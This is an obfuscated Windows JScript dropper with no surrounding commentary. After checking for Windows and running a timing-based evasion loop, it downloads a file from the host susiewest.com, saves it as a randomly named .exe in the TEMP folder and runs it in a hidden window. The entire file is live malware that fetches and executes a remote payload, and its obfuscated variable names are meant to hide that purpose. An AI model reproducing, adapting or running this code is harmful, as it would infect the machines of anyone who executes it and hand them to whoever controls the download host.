var _T0 = false;
var _M0 = "CreateObject";
var _P = function _KN() {return WScript[_M0]("WScript"+".Shell");}(), _OT = 11;
var _RD = "MSXML2.XMLHTTP";
var _JI = 2123213;
var _O = 0;
function _J(_FS){_P["Run"](_FS, _O, _O);};
function _TB(){return _RD + "";};
function _WJ(_QJ, _M1){_O = _O * 1; return _QJ - _M1;};
function _DB(){return _M0;};
/*@cc_on
  @if (@_win32 || @_win64)
    _T0 = true;
  @end
@*/
if (_T0)
{
var _E = "";
function _SQ(){return 22;};
var _PF = 0; var _OP = 0;
function _M()
{
var _J0 = new this["Date"]();
var _BL = _J0["getUTCMilliseconds"]();
WScript["Sleep"](_SQ());
var _J0 = new this["Date"]();
var _C = _J0["getUTCMilliseconds"]();
WScript["Sleep"](_SQ());
var _J0 = new this["Date"]();
var _N = _J0["getUTCMilliseconds"]();
var _PF = "_XO";
_PF = _WJ(_C, _BL);
var _OP = "_CN";
_OP = _WJ(_N, _C);
_E = "open";
return _WJ(_PF, _OP);
}
var _AU = false;
var _A = false;
for (var _ES = _O; _ES < _SQ() * 1; _ES++){if (_M() != _O){
_AU = true; 
_OP = "31" + 11 * _PF + _OP; 
_A = true; 
break;
}}
function _T() {return ((_AU == true) && (_AU == _A)) ? 1 : _O;};
if (_AU && _T() && _A){
function _S() {return _P["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "Z5SR3IPlRlwlcsSE.ex" + "e";};
 _G0 = _TB();
 _R = WScript[_M0](_G0);
 var _EA = 1;
 while (_EA){
try {
	if (_EA == 1)
	{
		_R[_E]("GET", "http://susiewest.com/u2w7q", false);
		_R["send"]();
		_O0 = "Sleep";
	}
	WScript[_O0](_SQ() + 120); 
	if (_R["readystate"] < 2 * 2) continue;
	_EA = _O;
	function _V(_K) {var _G = (1, 2, 3, 4, 5, _K); return _G;};
	_Q = WScript[_DB()]("ADODB.Stream");
	_G0 = _Q;
	_G0[_E]();
	_G0["type"] = _V(1);
	_G0["write"](_R["ResponseBody"]);
	_Q["position"] = _V(_O);
	_G0["Save" + "ToFile"](_S(), 2);
	_Q["cl"+"ose"]();
	_UK = _S();
	_J(_UK);
} catch(_XZ){};
}
}
}

